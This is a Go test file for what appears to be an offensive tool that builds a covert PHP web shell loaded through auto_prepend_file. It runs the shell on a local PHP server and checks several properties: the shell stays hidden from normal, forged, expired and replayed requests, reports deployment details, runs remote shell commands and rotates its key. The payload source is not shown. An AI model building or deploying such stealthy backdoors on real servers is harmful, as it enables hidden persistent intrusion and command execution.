package scanner

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestShellV2PHPSemiPersistRuntime proves the auto_prepend_file variant is
// invisible to normal traffic: a real `php -S` process prepends the payload
// before an ordinary app script, and unrelated requests must still render the
// app untouched (no globals, no output, restored error_reporting) while keyed
// requests are served on the same URL.
func TestShellV2PHPSemiPersistRuntime(t *testing.T) {
	php, err := exec.LookPath("php")
	if err != nil {
		t.Skip("php CLI not installed")
	}
	if testing.Short() {
		t.Skip("skipping runtime shell test in -short mode")
	}
	key, err := GenerateShellKey()
	if err != nil {
		t.Fatal(err)
	}
	carrier, err := GenerateShellCarrier()
	if err != nil {
		t.Fatal(err)
	}
	payload, err := BuildPHPSemiPersistPayloadV2(key, carrier)
	if err != nil {
		t.Fatal(err)
	}
	if payload.Build == "" || payload.Type != "php" || payload.Protocol != ShellProtocolV2 {
		t.Fatalf("unexpected payload metadata: %+v", payload)
	}

	dir := t.TempDir()
	shellPath := filepath.Join(dir, ".jwprepend.php")
	if err := os.WriteFile(shellPath, []byte(payload.Content), 0o600); err != nil {
		t.Fatal(err)
	}
	app := `<?php echo "app-ok:" . ((isset($jwK) || isset($jw0) || isset($jwEr)) ? "polluted" : "clean") . ":" . (error_reporting() === E_ALL ? "er-ok" : "er-bad");`
	if err := os.WriteFile(filepath.Join(dir, "index.php"), []byte(app), 0o600); err != nil {
		t.Fatal(err)
	}

	addr := startPHPServer(t, php, dir,
		"-d", "auto_prepend_file="+shellPath,
		"-d", "display_errors=1",
		"-d", "error_reporting=E_ALL")

	url := fmt.Sprintf("http://%s/index.php", addr)
	client := NewDeepClient(5 * time.Second)

	// Unrelated traffic must render the original app and pick up no globals.
	resp := client.Do(context.Background(), DeepRequest{Method: http.MethodGet, URL: url})
	if resp.Error != "" || resp.StatusCode != 200 {
		t.Fatalf("app request failed: status=%d err=%s", resp.StatusCode, resp.Error)
	}
	if !strings.Contains(resp.Body, "app-ok:clean:er-ok") {
		t.Fatalf("normal request was altered by the prepended payload: %q", resp.Body)
	}
	if _, err := decodeShellResponse(payload, resp.Body); err == nil {
		t.Fatal("normal request produced a protocol reply")
	}

	// A forged/garbage token must also pass through silently.
	forged := DeepRequest{Method: http.MethodPost, URL: url, BodyType: "form"}
	if strings.HasPrefix(carrier, "X-") {
		forged.Headers = map[string]string{carrier: "not-a-real-token"}
	} else {
		forged.Body = carrier + "=not-a-real-token"
	}
	resp = client.Do(context.Background(), forged)
	if resp.Error != "" || !strings.Contains(resp.Body, "app-ok:clean") {
		t.Fatalf("forged token was not passed through: status=%d err=%s body=%q", resp.StatusCode, resp.Error, resp.Body)
	}

	// An expired token must not be answered either.
	stale, err := sealShellToken(key, ShellCryptoGCM, shellWirePing(), time.Now().Add(-time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	staleReq := DeepRequest{Method: http.MethodPost, URL: url, BodyType: "form"}
	if strings.HasPrefix(carrier, "X-") {
		staleReq.Headers = map[string]string{carrier: stale}
	} else {
		staleReq.Body = carrier + "=" + stale
	}
	resp = client.Do(context.Background(), staleReq)
	if resp.Error != "" || !strings.Contains(resp.Body, "app-ok:clean") {
		t.Fatalf("expired token was not passed through: status=%d err=%s body=%q", resp.StatusCode, resp.Error, resp.Body)
	}

	// Runtime info must describe the real PHP process so deployment can pick a
	// mode and directory.
	info, err := QueryShellInfo(context.Background(), client, url, payload)
	if err != nil {
		t.Fatalf("query shell info: %v", err)
	}
	realDir, err := filepath.EvalSymlinks(dir)
	if err != nil {
		realDir = dir
	}
	infoDir := info.Dir
	if resolved, err := filepath.EvalSymlinks(infoDir); err == nil {
		infoDir = resolved
	}
	if infoDir != realDir {
		t.Fatalf("info dir = %q, want %q", info.Dir, realDir)
	}
	if info.SAPI != "cli-server" {
		t.Fatalf("info sapi = %q", info.SAPI)
	}
	if info.File != shellPath {
		t.Fatalf("info file = %q, want %q", info.File, shellPath)
	}
	if info.PHPVersion == "" || info.UserINIFilename != ".user.ini" || info.UserINICacheTTL != 300 {
		t.Fatalf("info fields missing: %+v", info)
	}
	if info.AutoPrependFile != shellPath {
		t.Fatalf("info auto_prepend_file = %q, want %q", info.AutoPrependFile, shellPath)
	}

	if alive, note := CheckShellAlive(context.Background(), client, url, payload); !alive {
		t.Fatalf("alive check failed: %s", note)
	}
	out, err := RunShellCommand(context.Background(), client, url, payload, "printf 'prepend-ok'")
	if err != nil {
		t.Fatalf("run command: %v", err)
	}
	if out != "prepend-ok" {
		t.Fatalf("command output = %q", out)
	}
	big, err := RunShellCommand(context.Background(), client, url, payload, "yes P | head -c 4096")
	if err != nil {
		t.Fatalf("run large command: %v", err)
	}
	if len(big) != 4096 || !strings.Contains(big, "P") {
		t.Fatalf("large output was corrupted or not decompressed: len=%d", len(big))
	}

	// Replaying a token the shell already accepted must fall through to the
	// app instead of being answered again (or leaking a 404 marker).
	req, err := payload.v2Request(url, shellWirePing())
	if err != nil {
		t.Fatal(err)
	}
	first := client.Do(context.Background(), req)
	replay := client.Do(context.Background(), req)
	if first.StatusCode != 200 {
		t.Fatalf("first ping status = %d", first.StatusCode)
	}
	if _, err := decodeShellResponse(payload, first.Body); err != nil {
		t.Fatalf("first ping not answered: %v", err)
	}
	if replay.StatusCode != 200 || !strings.Contains(replay.Body, "app-ok:clean") {
		t.Fatalf("replay was not passed through: status=%d body=%q", replay.StatusCode, replay.Body)
	}

	// The app keeps working after protocol traffic.
	resp = client.Do(context.Background(), DeepRequest{Method: http.MethodGet, URL: url})
	if resp.Error != "" || !strings.Contains(resp.Body, "app-ok:clean") {
		t.Fatalf("app broke after protocol traffic: status=%d err=%s body=%q", resp.StatusCode, resp.Error, resp.Body)
	}

	// Rotation must patch the payload in place and keep pass-through intact.
	newKey, err := GenerateShellKey()
	if err != nil {
		t.Fatal(err)
	}
	if err := RotateShellKey(context.Background(), client, url, payload, newKey); err != nil {
		t.Fatalf("rotate key: %v", err)
	}
	rotated := payload
	rotated.Key = newKey
	if out, err = RunShellCommand(context.Background(), client, url, rotated, "printf 'rotated-ok'"); err != nil || out != "rotated-ok" {
		t.Fatalf("command after rotation = %q, %v", out, err)
	}
	if _, err := RunShellCommand(context.Background(), client, url, payload, "printf 'old-key'"); err == nil {
		t.Fatal("old key still accepted after rotation")
	}
	source, err := os.ReadFile(shellPath)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(source, []byte(EncodeShellKey(key))) {
		t.Fatal("payload still embeds the rotated-out key")
	}
	resp = client.Do(context.Background(), DeepRequest{Method: http.MethodGet, URL: url})
	if resp.Error != "" || !strings.Contains(resp.Body, "app-ok:clean") {
		t.Fatalf("app broke after rotation: status=%d err=%s body=%q", resp.StatusCode, resp.Error, resp.Body)
	}
}
